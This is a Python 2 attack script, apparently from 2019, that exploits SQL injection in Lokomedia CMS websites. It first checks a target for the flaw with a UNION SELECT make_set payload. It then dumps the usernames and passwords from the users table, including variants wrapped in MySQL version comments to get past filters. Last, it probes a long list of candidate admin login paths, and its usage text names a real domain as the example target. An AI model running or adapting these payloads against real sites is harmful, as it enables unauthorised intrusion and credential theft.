#!/usr/bin/python

import requests
import time
import sys
import re

banner = """
                                                                                                         
  _____            __             ____    ____         _    _                  
 |_   _|          [  |  _        |_   \  /   _|       / |_ (_)                 
   | |       .--.  | | / ]  .--.   |   \/   |   .--. `| |-'__  _   __  .---.   
   | |   _ / .'`\ \| '' < / .'`\ \ | |\  /| | / .'`\ \| | [  |[ \ [  ]/ /__\\  	CODED BY : Axillerz
  _| |__/ || \__. || |`\ \| \__. |_| |_\/_| |_| \__. || |, | | \ \/ / | \__.,  	TEAM	 : Nobody Team Wants Me
 |________| '.__.'[__|  \_]'.__.'|_____||_____|'.__.' \__/[___] \__/   '.__.'  	COPYRIGHT (C) 2019
                                                                                                                                                                                                          
"""

class warna :
	HIJAU = '\033[92m'
	KUNING = '\033[33m'
	MERAH = '\033[31m'
	BIRU = '\033[94m'
	TUTUP = '\033[00m'
print warna.BIRU+banner+warna.TUTUP
def usage():
	print warna.MERAH
	print """Usage : python """+sys.argv[0]+""" <target>
	ex : python """+sys.argv[0]+""" http://lokomedia.co.id
	
	"""
	print warna.TUTUP
def cek(url):
	print warna.KUNING+"[+] Checking target..."+warna.TUTUP
	query = "/statis-1'union+select+make_set(6,@:=0x0a, (select(1)from(users)where@:=make_set(511,@,0x3C6C693E,username)),@)--+profil.html"
	lihat = requests.get(url+query).text
	if (re.search('<meta name="description" content="<li>',lihat) != None):
		print "[*] "+url+warna.HIJAU+" [ VULN ]"+warna.TUTUP
	else:
		print "[-] "+url+warna.MERAH+" [ NOT VULN ]"+warna.TUTUP
		time.sleep(0.5)
		print "[*] Finished..."
		sys.exit()
def exploiting(url):
	print warna.KUNING+"[+] Exploiting..."+warna.TUTUP
	time.sleep(1)
	user = "/statis-1'union+select+make_set(6,@:=0x0a, (select(1)from(users)where@:=make_set(511,@,0x3C6C693E,username)),@)--+profil.html"
	pwd = "/statis-1'union+select+make_set(6,@:=0x0a, (select(1)from(users)where@:=make_set(511,@,0x3C6C693E,password)),@)--+profil.html"
	bypass_user = "/statis-1'/*!50000union*/+/*!50000select*/+make_set(6,@:=0x0a, (select(1)from(users)where@:=make_set(511,@,0x3C6C693E,username)),@)--+profil.html"
	bypass_pwd = "/statis-1'/*!50000union*/+/*!50000select*/+make_set(6,@:=0x0a, (select(1)from(users)where@:=make_set(511,@,0x3C6C693E,password)),@)--+profil.html"
	req = requests.get(url+user).text
	myuser = re.findall("<meta name=\"description\" content=\"(.+?)\">",req)
	for u in myuser:
		spl = u.split('<li>')
	print "="*70
	print "[+] "+warna.HIJAU+"USERNAME:"+warna.TUTUP
	print "="*70
	for usr in spl:
		get_user = usr
		print "[*] "+warna.BIRU+get_user+warna.TUTUP
	print "="*70
	req = requests.get(url+pwd).text
	mypwd = re.findall("<meta name=\"description\" content=\"(.+?)\">",req)	
	for u in mypwd:
		spl = u.split('<li>')
	time.sleep(1)
	print "="*70
	print "[+] "+warna.HIJAU+"PASSWORD:"+warna.TUTUP
	print "="*70
	for usr in spl:
		get_pwd = usr
		print "\r[*] "+warna.BIRU+get_pwd+warna.TUTUP	
	print "="*70
def adminpage(url):
	print ""
	print "[+] "+warna.KUNING+"Scanning admin page"+warna.TUTUP
	adm =[
	'/adm',
	'/admin',
	'/Admin',
	'/Redaktur',
	'/redaktur/index.php',
	'/Adminlogin',
	'/admin.php',
	'/login',
	'/login.php',
	'/adminweb',
	'/webadmin',
	'/admin1.php',
	'/admin1.html',
	'/admin2.php',
	'/admin2.html',
	'/admin3.php',
	'/admin3.html',
	'/yonetim.php',
	'/yonetim.html',
	'/yonetici.php',
	'/yonetici.html',
	'/ccms/',
	'/ccms/login.php',
	'/ccms/index.php',
	'/maintenance/',
	'/webmaster/',
	'/configuration/',
	'/configure/',
	'/websvn/',
	'/admin/account.php',
	'/admin/account.html',
	'/admin/index.php',
	'/admin/index.html',
	'/admin/login.php',
	'/admin/login.html',
	'/admin/home.php',
	'/admin/controlpanel.html',
	'/admin/controlpanel.php',
	'/admin.php',
	'/admin.html',
	'/admin/cp.php',
	'/admin/cp.html',
	'/cp.php',
	'/cp.html',
	'/administrator/',
	'/administrator/index.html',
	'/administrator/index.php',
	'/administrator/login.html',
	'/administrator/login.php',
	'/administrator/account.html',
	'/administrator/account.php',
	'/administrator.php',
	'/administrator.html',
	'/login.php',
	'/login.html',
	'/modelsearch/login.php',
	'/moderator.php',
	'/moderator.html',
	'/moderator/login.php',
	'/moderator/login.html',
	'/moderator/admin.php',
	'/moderator/admin.html',
	'/moderator/','/account.php',
	'/account.html',
	'/controlpanel/',
	'/controlpanel.php',
	'/controlpanel.html',
	'/admincontrol.php',
	'/admincontrol.html',
	'/adminpanel.php',
	'/adminpanel.html',
	'/admin1.asp',
	'/admin2.asp',
	'/yonetim.asp',
	'/yonetici.asp',
	'/admin/account.asp',
	'/admin/index.asp',
	'/admin/login.asp',
	'/admin/home.asp',
	'/admin/controlpanel.asp',
	'/admin.asp',
	'/admin/cp.asp',
	'/cp.asp',
	'/administrator/index.asp',
	'/administrator/login.asp',
	'/administrator/account.asp',
	'/administrator.asp',
	'/login.asp',
	'/modelsearch/login.asp',
	'/moderator.asp',
	'/moderator/login.asp',
	'/moderator/admin.asp',
	'/account.asp',
	'/controlpanel.asp',
	'/admincontrol.asp',
	'/adminpanel.asp',
	'/fileadmin/',
	'/fileadmin.php',
	'/fileadmin.asp',
	'/fileadmin.html',
	'/administration/',
	'/administration.php',
	'/administration.html',
	'/sysadmin.php',
	'/sysadmin.html',
	'/sysadmin.asp',
	'/sysadmin/',
	'/ur-admin.asp',
	'/ur-admin.php',
	'/ur-admin.html',
	'/ur-admin/',
	'/Server.php',
	'/Server.html',
	'/Server.asp',
	'/Server/',
	'/administr8.php',
	'/administr8.html',
	'/administr8/',
	'/administr8.asp',
	'/webadmin/',
	'/webadmin.php',
	'/webadmin.asp',
	'/webadmin.html',
	'/administratie/',
	'/admins/',
	'/admins.php',
	'/admins.asp',
	'/admins.html',
	'/administrivia/',
	'/Database_Administration/',
	'/WebAdmin/',
	'/useradmin/',
	'/sysadmins/',
	'/admin1/',
	'/system-administration/',
	'/administrators/',
	'/pgadmin/',
	'/directadmin/',
	'/staradmin/',
	'/ServerAdministrator/',
	'/SysAdmin/',
	'/administer/',
	'/LiveUser_Admin/',
	'/sys-admin/',
	'/panel/',
	'/cpanel/',
	'/cPanel/',
	'/cpanel_file/',
	'/platz_login/',
	'/rcLogin/',
	'/formslogin/',
	'/autologin/',
	'/support_login/',
	'/meta_login/',
	'/manuallogin/',
	'/simpleLogin/',
	'/loginflat/',
	'/utility_login/',
	'/showlogin/',
	'/login-redirect/',
	'/sub-login/',
	'/login1/',
	'/dir-login/',
	'/login_db/',
	'/xlogin/',
	'/smblogin/',
	'/customer_login/',
	'/UserLogin/',
	'/login-us/',
	'/acct_login/',
	'/admin_area/',
	'/bigadmin/',
	'/project-admins/',
	'/pureadmin/',
	'/pureadmin/',
	'/adminpro/',
	'/_adm_/',
	'/_admin_/',
	'/_administrator_/',
	'/operator/',
	'/sika/',
	'/develop/',
	'/ketua/',
	'/redaktur/',
	'/author',
	'/admin/',
	'/administrator/',
	'/adminweb/',
	'/user/',
	'/users/',
	'/dinkesadmin/',
	'/retel/',
	'/author/',
	'/panel/',
	'/paneladmin/',
	'/panellogin/',
	'/redaksi/',
	'/cp-admin/',
	'/master/',
	'/master/index.php',
	'/master/login.php',
	'/operator/index.php',
	'/sika/index.php',
	'/develop/index.php',
	'/ketua/index.php',
	'/redaktur/index.php',
	'/admin/index.php',
	'/administrator/index.php',
	'/adminweb/index.php',
	'/user/index.php',
	'/users/index.php',
	'/dinkesadmin/index.php',
	'/retel/index.php',
	'/author/index.php',
	'/panel/index.php',
	'/paneladmin/index.php',
	'/panellogin/index.php',
	'/redaksi/index.php',
	'/cp-admin/index.php',
	'/operator/login.php',
	'/sika/login.php',
	'/develop/login.php',
	'/ketua/login.php',
	'/redaktur/login.php',
	'/admin/login.php',
	'/administrator/login.php',
	'/adminweb/login.php',
	'/user/login.php',
	'/users/login.php',
	'/dinkesadmin/login.php',
	'/retel/login.php',
	'/author/login.php',
	'/panel/login.php',
	'/paneladmin/login.php',
	'/panellogin/login.php',
	'/redaksi/login.php',
	'/cp-admin/login.php',
	'/terasadmin/',
	'/terasadmin/index.php',
	'/terasadmin/login.php',
	'/rahasia/',
	'/rahasia/index.php',
	'/rahasia/admin.php',
	'/rahasia/login.php',
	'/dinkesadmin/',
	'/dinkesadmin/login.php',
	'/adminpmb/',
	'/adminpmb/index.php',
	'/adminpmb/login.php',
	'/system/',
	'/system/index.php',
	'/system/login.php',
	'/webadmin/',
	'/webadmin/index.php',
	'/webadmin/login.php',
	'/wpanel/',
	'/wpanel/index.php',
	'/wpanel/login.php',
	'/adminpanel/index.php',
	'/adminpanel/',
	'/adminpanel/login.php',
	'/adminkec/',
	'/adminkec/index.php',
	'/adminkec/login.php',
	'/admindesa/',
	'/admindesa/index.php',
	'/admindesa/login.php',
	'/adminkota/',
	'/adminkota/index.php',
	'/adminkota/login.php',
	'/admin123/',
	'/admin123/index.php',
	'/admin123/login.php',
	'/logout/',
	'/logout/index.php',
	'/logout/login.php',
	'/logout/admin.php',
	'/adminweb_setting',
	'/kpum_aw/',
	'/panel-administracion/',
	'/instadmin/',
	'/memberadmin/',
	'/siteadmin/login.php',
	'/siteadmin/index.php',
	'/siteadmin/login.html',
	'/bb-admin/index.php',
	'/bb-admin/login.php',
	'/bb-admin/admin.php',
	'/operator/',
	'/sika/',
	'/develop/',
	'/ketua/',
	'/redaktur/',
	'/admin/',
	'/administrator/',
	'/adminweb/',
	'/user/',
	'/users/',
	'/dinkesadmin/',
	'/retel/',
	'/author/',
	'/panel/',
	'/paneladmin/',
	'/panellogin/',
	'/redaksi/',
	'/cp-admin/',
	'/master/',
	'/master/index.php',
	'/master/login.php',
	'/operator/index.php',
	'/sika/index.php',
	'/develop/index.php',
	'/developer/index.php',
	'/ketua/index.php',
	'/redaktur/index.php',
	'/admin/index.php',
	'/administrator/index.php',
	'/adminweb/index.php',
	'/user/index.php',
	'/users/index.php',
	'/dinkesadmin/index.php',
	'/retel/index.php',
	'/author/index.php',
	'/panel/index.php',
	'/paneladmin/index.php',
	'/panellogin/index.php',
	'/redaksi/index.php',
	'/cp-admin/index.php',
	'/operator/login.php',
	'/sika/login.php',
	'/develop/login.php',
	'/ketua/login.php',
	'/redaktur/login.php',
	'/admin/login.php',
	'/administrator/login.php',
	'/adminweb/login.php',
	'/user/login.php',
	'/users/login.php',
	'/dinkesadmin/login.php',
	'/retel/login.php',
	'/author/login.php',
	'/panel/login.php',
	'/paneladmin/login.php',
	'/panellogin/login.php',
	'/redaksi/login.php',
	'/cp-admin/login.php',
	'/terasadmin/',
	'/terasadmin/index.php',
	'/terasadmin/login.php',
	'/rahasia/',
	'/rahasia/index.php',
	'/rahasia/admin.php',
	'/rahasia/login.php',
	'/dinkesadmin/',
	'/dinkesadmin/login.php',
	'/adminpmb/',
	'/adminpmb/index.php',
	'/adminpmb/login.php',
	'/system/',
	'/system/index.php',
	'/system/login.php',
	'/webadmin/',
	'/webadmin/index.php',
	'/webadmin/login.php',
	'/wpanel/',
	'/wpanel/index.php',
	'/wpanel/login.php',
	'/adminpanel/index.php',
	'/adminpanel/',
	'/adminpanel/login.php',
	'/adminkec/',
	'/adminkec/index.php',
	'/adminkec/login.php',
	'/admindesa/',
	'/admindesa/index.php',
	'/admindesa/login.php',
	'/adminkota/',
	'/adminkota/index.php',
	'/adminkota/login.php',
	'/admin123/',
	'/admin123/index.php',
	'/admin123/login.php',
	'/logout/',
	'/logout/index.php',
	'/logout/login.php',
	'/logout/admin.php',
	'/sistem/',
	'/webpanel/',
	'/w3bc0ntr0l/',
	'/apanel/',
	'/sysadmin/'
	]
	for cek in adm:
		a = requests.get(url+cek).status_code
		if (a == 200):
			print "[*] "+url+cek+warna.HIJAU+" [ 200 ]"+warna.TUTUP
		else:
			print "[*] "+url+cek+warna.MERAH+" [ 404 ]"+warna.TUTUP
def main():
	if (len(sys.argv) != 2):
		usage()
		sys.exit()
	cek(sys.argv[1])
	print ''
	exploiting(sys.argv[1])
	print ''
	adminpage(sys.argv[1])
	print ''
if __name__ == "__main__":
	main()
		
	
	
	
	
	